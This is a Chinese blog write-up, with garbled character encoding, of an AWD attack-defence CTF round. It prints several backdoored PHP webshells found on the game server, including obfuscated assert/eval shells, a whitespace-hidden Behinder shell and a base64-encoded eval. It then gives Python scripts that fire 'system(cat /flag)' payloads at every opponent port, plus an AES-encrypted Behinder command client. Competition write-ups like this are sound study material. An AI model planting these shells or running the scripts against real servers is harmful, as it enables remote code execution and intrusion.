<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="ç…¤çŸ¿è·¯å£è¥¿"><link rel="alternative" href="/atom.xml" title="The blog of mklkx" type="application/atom+xml"><link rel="icon" href="/favicon.png"><title>AWD-1 - The blog of mklkx</title>
<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
<!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]-->
<script src="/js/jquery-3.1.1.min.js"></script>

<script src="/js/fancybox/jquery.fancybox.min.js"></script>
<meta name="generator" content="Hexo 5.4.0"></head><body style="opacity:0"><header class="head"><h1 class="head-title u-fl"><a href="/">The blog of mklkx</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/tags">æ ‡ç­¾</a></li><li class="head-nav__item"><a class="head-nav__link" href="/archives">ç›®å½•</a></li><li class="head-nav__item"><a class="head-nav__link" href="/friends">å‹é“¾</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"><time class="post__time" datetime="2021-03-22T12:56:06.000Z">2021 - 03 - 22 20:56:06</time><h1 class="post__title"><a href="/posts/f30cce36.html">AWD-1</a></h1><div class="post__main echo"><h3 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h3><hr>
<p><strong>å¯ç¤ºï¼šæ–°æ”¶è·ï¼Œä½“ä¼šåˆ°äº†AWDçš„ä¹è¶£</strong></p>
<blockquote>
<p>å°½ç®¡ç¬”è€…è¿˜æ˜¯å¾ˆèœï¼Œä½†æ˜¯äº‹åå­¦ä¼šå†™æ‰¹é‡åŒ–è„šæœ¬æˆåŠŸåï¼Œè¿˜æ˜¯ä½“ä¼šåˆ°äº†AWDçš„ä¹è¶£ï¼Œæœ‰ç‚¹æ„æ€~</p>
</blockquote>
<hr>
<h4 id="å‡†å¤‡å·¥ä½œï¼š"><a href="#å‡†å¤‡å·¥ä½œï¼š" class="headerlink" title="å‡†å¤‡å·¥ä½œï¼š"></a><strong>å‡†å¤‡å·¥ä½œï¼š</strong></h4><p>é€šè¿‡WinSCPï¼ˆXshellç­‰ï¼‰è¿æ¥ç™»å½•åï¼Œå¤‡ä»½/var/www/htmlï¼Œå°†æ­¤ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æ‹–å…¥Dç›¾ï¼Œå‘ç°éƒ¨åˆ†æ¼æ´ã€‚ğŸ‘‡</p>
<p><img src="https://s3.ax1x.com/2020/12/05/DLnYgx.jpg" alt="Dç›¾"></p>
<p>æŒ¨ä¸ªä¿®å­</p>
<hr>
<h4 id="1"><a href="#1" class="headerlink" title="1"></a><em>1</em></h4><h5 id="config-common-php"><a href="#config-common-php" class="headerlink" title=".config_common.php"></a><strong>.config_common.php</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$a&#x3D;base64_decode(&quot;Y&quot;.&quot;X&quot;.&quot;N&quot;.&quot;z&quot;.&quot;Z&quot;.&quot;X&quot;.&quot;J&quot;.&quot;0&quot;);</span><br><span class="line">$a(@$&#123;&quot;_P&quot;.&quot;O&quot;.&quot;S&quot;.&quot;T&quot;&#125;[520]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç®€å•åˆ†è¡Œåï¼Œå°†â€™YXNzZXJ0â€™è¿›è¡Œbase64åŠ å¯†åå¾—â€™assertâ€™,å³assert(@$_POST[520]);ï¼Œæ„ä¸ºä¼ å…¥ä¸€ä¸ªåä¸º520çš„å˜é‡ï¼Œæ–¹å¼ä¸ºPOSTä¼ å‚ï¼Œåä»¥PHPä»£ç çš„æ–¹å¼æ‰§è¡Œã€‚</p>
<p>å› æ­¤ï¼Œåœ¨ç½‘ç«™ä¸Šå°è¯•POSTä¼ å‚â€™520=system(â€˜cat /flagâ€™);â€™åå¯å¾—flagã€‚ğŸ‘‡</p>
<p><img src="https://s3.ax1x.com/2020/12/05/DLnGCR.jpg" alt="config_common"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ‰¹é‡åŒ–çš„è¿‡ç¨‹ï¼Œæ˜ç¡®æ€è·¯ï¼š</p>
<p>1.æ”»å‡»ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">port_start&#x3D;8801</span><br><span class="line">port_end&#x3D;8808</span><br><span class="line">my_port&#x3D;8802</span><br><span class="line">flag&#x3D;[]</span><br><span class="line">token&#x3D;&#39;1f208fe1a06b1d6db7ff6b7a7db3aefe&#39;</span><br></pre></td></tr></table></figure>

<p>2.è·å–flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def config_common(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;.config_common.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;520&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure>

<p>3.æäº¤flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in range(port_start,port_end+1):</span><br><span class="line">    if(i&#x3D;&#x3D;my_port):</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        config_common(i)</span><br><span class="line">        #pdd(i)</span><br><span class="line">        #function111(i)</span><br><span class="line">        #function4eff2(i)</span><br><span class="line">        #ciscn_notes(i)</span><br><span class="line">        #ciscn_config2(i)</span><br><span class="line">        #ciscn_include2(i)</span><br><span class="line">        #ciscn_url(i)</span><br><span class="line">        #ciscn_include(i)#å†°è</span><br><span class="line">        #ciscn_config1(i)</span><br><span class="line">        submit_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:9090&#x2F;&#39;</span><br><span class="line">        for i in flag:</span><br><span class="line">            submit_flag&#x3D;&#123;&#39;flag&#39;:i,&#39;token&#39;:token&#125;</span><br><span class="line">            requests.post(url&#x3D;submit_url,data&#x3D;submit_flag)</span><br><span class="line">time.sleep(60*5)</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­è¿˜åŒ…æ‹¬å¼‚å¸¸å¤„ç†çš„éƒ¨åˆ†ï¼Œå¯é€æ­¥å®Œå–„ã€‚</p>
<hr>
<h4 id="2"><a href="#2" class="headerlink" title="2"></a><em>2</em></h4><h5 id="pdd-php"><a href="#pdd-php" class="headerlink" title="pdd.php"></a><strong>pdd.php</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[&quot;pdsdt&quot;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸ç¬¬ä¸€é¢˜å¤§åŒå°å¼‚ï¼Œç½‘é¡µå‘½ä»¤åŒä¸ºâ€™pdsdt=system(â€˜cat /flagâ€™);â€™</p>
<p>è´´è„šæœ¬ï¼Œç›¸åŒéƒ¨åˆ†ä¸å†èµ˜è¿°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def pdd(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;pdd.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;pdsdt&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3"><a href="#3" class="headerlink" title="3"></a><em>3</em></h4><h5 id="111-php"><a href="#111-php" class="headerlink" title="111.php"></a><strong>111.php</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass&#x3D;$_POST[&quot;password&quot;];</span><br><span class="line">if($pass &#x3D;&#x3D; &quot;4eff2c041976ea22afb7092a53188c70&quot;)</span><br><span class="line">	&#123;</span><br><span class="line">		system($_GET[&quot;getshell&quot;]);</span><br><span class="line">		readfile(&quot;&#x2F;flag&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;be1c5ff7101b7791469b5df2315cf75a&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>POSTä¼ å…¥ä¸€ä¸ªåä¸ºpasswordçš„å˜é‡èµ‹å€¼ç»™passï¼Œè‹¥è¯¥å˜é‡ï¼ˆpassword=&gt;passï¼‰==â€4eff2c041976ea22afb7092a53188c70â€,åˆ™ç³»ç»Ÿè‡ªåŠ¨è¿”å›æ ¹ç›®å½•ä¸‹flagçš„æ“ä½œï¼›è‹¥ä¸æ˜¯ï¼Œåˆ™è¿”å›å‡çš„flagã€‚</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def function111(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;uploads&#x2F;.111.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;password&quot;:&quot;4eff2c041976ea22afb7092a53188c70&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4"><a href="#4" class="headerlink" title="4"></a><em>4</em></h4><h5 id="4eff2c041976ea22afb7092a53188c70-php"><a href="#4eff2c041976ea22afb7092a53188c70-php" class="headerlink" title="4eff2c041976ea22afb7092a53188c70.php"></a><strong>4eff2c041976ea22afb7092a53188c70.php</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&quot;cmd&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>åŒç¬¬ä¸€ç¬¬äºŒé¢˜ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def function4eff2(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;uploads&#x2F;4eff2c041976ea22afb7092a53188c70.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;cmd&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="5"><a href="#5" class="headerlink" title="5"></a><em>5</em></h4><h5 id="ciscn-url-php"><a href="#ciscn-url-php" class="headerlink" title="ciscn_url.php"></a><strong>ciscn_url.php</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">$parts &#x3D; parse_url($url);</span><br><span class="line">if(empty($parts[&#39;host&#39;]) || $parts[&#39;host&#39;] !&#x3D; &#39;localhost&#39;) &#123;</span><br><span class="line">    exit(&#39;error&#39;);</span><br><span class="line">&#125;</span><br><span class="line">readfile($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸ä¹‹å‰ä¸åŒï¼Œæ­¤ä¸ºgetä¼ å‚ä¸€ä¸ªåä¸ºurlçš„å˜é‡ï¼Œèµ‹å€¼ç»™äº†urlï¼Œç»è¿‡è§£æåä¼ ç»™äº†partså˜é‡ï¼Œè‹¥partså˜é‡çš„hostéƒ¨åˆ†ä¸ºç©ºæˆ–ä¸ç­‰äºâ€™localhostâ€™ï¼Œåˆ™errorã€‚æ•…æ˜ç¡®è¯¥å‘½ä»¤çš„æ­£ç¡®å½¢å¼åº”è¯¥ä¸ºâ€™?url=file://localhost/flagâ€™</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_url(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_url.php?&#39;</span><br><span class="line">    payload &#x3D; &#123;&quot;url&quot;:&quot;file:&#x2F;&#x2F;localhost&#x2F;flag&quot;&#125;</span><br><span class="line">    req &#x3D; requests.get(url&#x3D;attack_url,params&#x3D;payload)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="6"><a href="#6" class="headerlink" title="6"></a><em>6</em></h4><h5 id="ciscn-notes-php"><a href="#ciscn-notes-php" class="headerlink" title="ciscn_notes.php"></a><strong>ciscn_notes.php</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">include(&#39;ciscn_config.php&#39;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;id&#39;]))&#123;</span><br><span class="line">    $id &#x3D; mysql_real_escape_string($_GET[&#39;id&#39;]);</span><br><span class="line">    if(isset($_GET[&#39;topic&#39;]))&#123;</span><br><span class="line">        $topic &#x3D; mysql_real_escape_string($_GET[&#39;topic&#39;]);</span><br><span class="line">        $topic &#x3D; sprintf(&quot;AND topic&#x3D;&#39;%s&#39;&quot;, $topic);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $topic &#x3D; &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    $sql &#x3D; sprintf(&quot;SELECT * FROM notes WHERE id&#x3D;&#39;%s&#39; $topic&quot;, $id);</span><br><span class="line">    $result &#x3D; mysql_query($sql,$con);</span><br><span class="line">    $row &#x3D; mysql_fetch_array($result);</span><br><span class="line">    if(isset($row[&#39;topic&#39;])&amp;&amp;isset($row[&#39;substance&#39;]))&#123;</span><br><span class="line">        echo &quot;&lt;h1&gt;&quot;.$row[&#39;topic&#39;].&quot;&lt;&#x2F;h1&gt;&lt;br&gt;&quot;.$row[&#39;substance&#39;];</span><br><span class="line">        die();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;You&#39;re wrong!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ciscn_nt &#123;</span><br><span class="line">    var $a;</span><br><span class="line">    var $b;</span><br><span class="line">    function __construct($a,$b) &#123;</span><br><span class="line">        $this-&gt;a&#x3D;$a;</span><br><span class="line">        $this-&gt;b&#x3D;$b;</span><br><span class="line">    &#125;</span><br><span class="line">    function test() &#123;</span><br><span class="line">       array_map($this-&gt;a,$this-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p1&#x3D;new ciscn_nt(assert,array($_POST[&#39;x&#39;]));</span><br><span class="line">$p1-&gt;test();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;myblog&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;..&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;navbar-header&quot;&gt;</span><br><span class="line">        &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;#&quot;&gt;Blog&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;ul class&#x3D;&quot;nav navbar-nav&quot;&gt;</span><br><span class="line">            &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;#&quot;&gt;ç¬”è®°&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href&#x3D;&quot;#&quot;&gt;å…³äº&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;&#x2F;ul&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;&lt;&#x2F;nav&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;panel panel-success&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;panel-heading&quot;&gt;</span><br><span class="line">        &lt;h1 class&#x3D;&quot;panel-title&quot;&gt;phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;panel-body&quot;&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href&#x3D;&#39;ciscn_notes.php?id&#x3D;1&amp;topic&#x3D;Welcome to PHP world&#39;&gt;Welcome to PHP world&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href&#x3D;&#39;ciscn_notes.php?id&#x3D;2&amp;topic&#x3D;Do the best you can&#39;&gt;Do the best you can&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href&#x3D;&#39;ciscn_notes.php?id&#x3D;3&amp;topic&#x3D;Attention, please.&#39;&gt;æ ¼å¼åŒ–ï¼Œå…¨éƒ½æ ¼å¼åŒ–ã€‚ã€‚ã€‚&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--mysql_real_escape_string()--&gt;</span><br><span class="line">&lt;!--$topic &#x3D; sprintf(&quot;AND topic&#x3D;&#39;%s&#39;&quot;, $topic);--&gt;</span><br><span class="line">&lt;!--$sql &#x3D; sprintf(&quot;SELECT * FROM notes WHERE id&#x3D;&#39;%s&#39; $topic&quot;, $id)--&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>è§‚å¯Ÿå¯å¾—è¯¥ç½‘é¡µçš„phpéƒ¨åˆ†æœ‰ä¸€æ˜æ˜¾æ´ï¼Œä¸ºPOSTä¼ å…¥ä¸€ä¸ªåä¸ºxçš„å˜é‡.</p>
<blockquote>
<p>ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¯¥éƒ¨åˆ†è¿”å›çš„req.textä¸æ­¢flagéƒ¨åˆ†ï¼Œæ•…éœ€å¯¹è·å¾—çš„æ•°æ®åšè¿›ä¸€æ­¥å¤„ç†æ‰è¡Œ</p>
</blockquote>
<p><img src="https://s3.ax1x.com/2020/12/05/DLn359.jpg" alt="notes"></p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_notes(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_notes.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;x&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    #print(req.text)</span><br><span class="line">    key&#x3D;(req.text).split(&#39;: &#39;)[1][0:32]</span><br><span class="line">    flag.append(key)</span><br><span class="line">    print(flag)</span><br><span class="line">    #exception(req)</span><br></pre></td></tr></table></figure>

<h4 id="7"><a href="#7" class="headerlink" title="7"></a><em>7</em></h4><h5 id="ciscn-include-php"><a href="#ciscn-include-php" class="headerlink" title="ciscn_include.php"></a><strong>ciscn_include.php</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è¯¥å¤„å¯é€šè¿‡å†°èè¿æ¥ä»¥åŠCOOKIEä¼ å‚ä¸€ä¸ªåä¸ºcookieçš„å˜é‡â€™cookie=system(â€˜cat /flagâ€™);â€™å¯å¾—ï¼š</p>
<p>(1)å†°èè¿æ¥ğŸ‘‡</p>
<p><img src="https://s3.ax1x.com/2020/12/05/DLnJ81.jpg" alt="bx"></p>
<p>æ‰¹é‡è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#å†°è</span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">def padding_zero(key) -&gt; bytes:</span><br><span class="line">    output &#x3D; list(key)</span><br><span class="line">    while len(output) % 16:</span><br><span class="line">        output.append(&#39;\x00&#39;)</span><br><span class="line">    return &#39;&#39;.join(output).encode()</span><br><span class="line"></span><br><span class="line">def padding_pkcs5(msg) -&gt; bytes:</span><br><span class="line">    if isinstance(msg, str):</span><br><span class="line">        msg &#x3D; msg.encode()</span><br><span class="line">    if len(msg) &#x3D;&#x3D; 0x10:</span><br><span class="line">        return msg + b&#39;\x10&#39; * 0x10</span><br><span class="line">    return msg + (</span><br><span class="line">        0x10 - len(msg) % 0x10) * chr(0x10 - len(msg) % 0x10).encode()</span><br><span class="line"></span><br><span class="line">def aes_encrypt(msg, key) -&gt; str:</span><br><span class="line">    key&#x3D;padding_zero(key)</span><br><span class="line">    enc &#x3D; AES.new(key, AES.MODE_CBC, b&#39;\x00&#39; * 16)</span><br><span class="line">    return base64.b64encode(enc.encrypt(padding_pkcs5(msg))).decode()</span><br><span class="line"></span><br><span class="line">def get_key(url):</span><br><span class="line">    Getparams&#x3D;&#123;&quot;pass&quot;:&quot;1&quot;&#125;</span><br><span class="line">    key &#x3D; session.get(url,params&#x3D;Getparams).content</span><br><span class="line">    key &#x3D; str(key, encoding &#x3D; &quot;utf-8&quot;)</span><br><span class="line">    return key</span><br><span class="line"></span><br><span class="line">def main_exec(url,command,key):</span><br><span class="line">    command &#x3D; bytes(command, encoding &#x3D; &quot;utf8&quot;)</span><br><span class="line">    command_b64&#x3D; str(base64.b64encode(command), encoding &#x3D; &quot;utf-8&quot;)</span><br><span class="line"></span><br><span class="line">    command_eval&#x3D;&quot;assert|eval(base64_decode(&#39;&#123;&#125;&#39;));&quot;.format(command_b64)</span><br><span class="line">    postdata&#x3D;aes_encrypt(command_eval,key)</span><br><span class="line"></span><br><span class="line">    res&#x3D;session.post(url,data&#x3D;postdata).content</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def main_exec_encode(url,command,key):</span><br><span class="line">    command2 &#x3D; &quot;ob_start();&quot;+command+&quot;$flag &#x3D; ob_get_contents();ob_end_clean();for($i&#x3D;0;$i&lt;10;$i++)&#123;$flag&#x3D;bin2hex($flag);$flag&#x3D;base64_encode($flag);&#125;print($flag);&quot;</span><br><span class="line">    command2 &#x3D; bytes(command2, encoding &#x3D; &quot;utf8&quot;)</span><br><span class="line"></span><br><span class="line">    command_b64 &#x3D; str(base64.b64encode(command2), encoding &#x3D; &quot;utf-8&quot;)</span><br><span class="line">    command_eval&#x3D;&quot;assert|eval(base64_decode(&#39;&#123;&#125;&#39;));&quot;.format(command_b64)</span><br><span class="line">    postdata&#x3D;aes_encrypt(command_eval,key)</span><br><span class="line"></span><br><span class="line">    res&#x3D;session.post(url,data&#x3D;postdata).content</span><br><span class="line"></span><br><span class="line">    for i in range(10):</span><br><span class="line">        res &#x3D; base64.b64decode(res)</span><br><span class="line">        res &#x3D; codecs.decode(res,&quot;hex&quot;)</span><br><span class="line">        return res</span><br><span class="line">    </span><br><span class="line">def ciscn_include(i):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;XXX:&quot;+str(i)+&quot;&#x2F;blog&#x2F;ciscn_include.php&quot;</span><br><span class="line">    command &#x3D; &quot;system(&#39;cat &#x2F;flag&#39;);&quot;</span><br><span class="line">    key &#x3D; &quot;e45e329feb5d925b&quot;</span><br><span class="line">    flag &#x3D; main_exec(url,command,key)</span><br><span class="line">    #flag2 &#x3D; main_exec_encode(url,command,key)</span><br><span class="line">    #flag&#x3D;(flag_[2:-1])</span><br><span class="line">    print(flag)</span><br><span class="line">    #print(flag2)</span><br><span class="line">    </span><br><span class="line">#å†°èend</span><br></pre></td></tr></table></figure>


<p>(2)COOKIEä¼ å‚è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_include2(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_include.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;cookie&quot;:&quot;&#x2F;flag&quot;&#125;</span><br><span class="line">    req&#x3D;requests.get(url&#x3D;attack_url,cookies&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="8"><a href="#8" class="headerlink" title="8"></a><em>8</em></h4><h5 id="ciscn-config-php"><a href="#ciscn-config-php" class="headerlink" title="ciscn_config.php"></a><strong>ciscn_config.php</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Mysqlé–¾ç‚¬å¸´é–°å¶‡ç–†&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">$con &#x3D; mysql_connect (&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;c933ccc3b6b2fe8cb830a5e76f5f98a5&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">  print(&#39;Could not connect: &#39; . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">mysql_select_db(&quot;ciscn_web&quot;, $con);</span><br><span class="line"></span><br><span class="line">forward_static_call_array(assert,array($_POST[&quot;x&quot;]));</span><br><span class="line">class c</span><br><span class="line">&#123;</span><br><span class="line">        public $code &#x3D; null;</span><br><span class="line">        public $decode &#x3D; null;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;       $this-&gt;code&#x3D;&#39;ZXZhbCgkX1BPU1RbcGFzc10pOw&#x3D;&#x3D;&#39;;</span><br><span class="line">                $this-&gt;decode &#x3D; @base64_decode( $this-&gt;code );</span><br><span class="line">                @Eval($this-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">new c();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªæ´åœ¨è¿™ä¸ªéƒ¨åˆ†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;code&#x3D;&#39;ZXZhbCgkX1BPU1RbcGFzc10pOw&#x3D;&#x3D;&#39;;</span><br><span class="line">$this-&gt;decode &#x3D; @base64_decode( $this-&gt;code );</span><br><span class="line">@Eval($this-&gt;decode);</span><br></pre></td></tr></table></figure>

<p>å°†ä¸€ä¸²å­—ç¬¦ä¸²èµ‹å€¼ç»™$this-&gt;code(å¯ç®€å•ç†è§£ä¸ºä¸€ä¸ªå˜é‡);å°†è¯¥å˜é‡è¿›è¡Œbase64è§£ç åï¼Œèµ‹å€¼ç»™$this-&gt;decode;å°†æ­¤å˜é‡å½“ä½œphpä»£ç æ‰§è¡Œã€‚</p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å°†æ­¤å­—ç¬¦ä¸²è¿›è¡Œbase64è§£å¯†ï¼Œå¾—â€™eval($_POST[pass]);â€™</p>
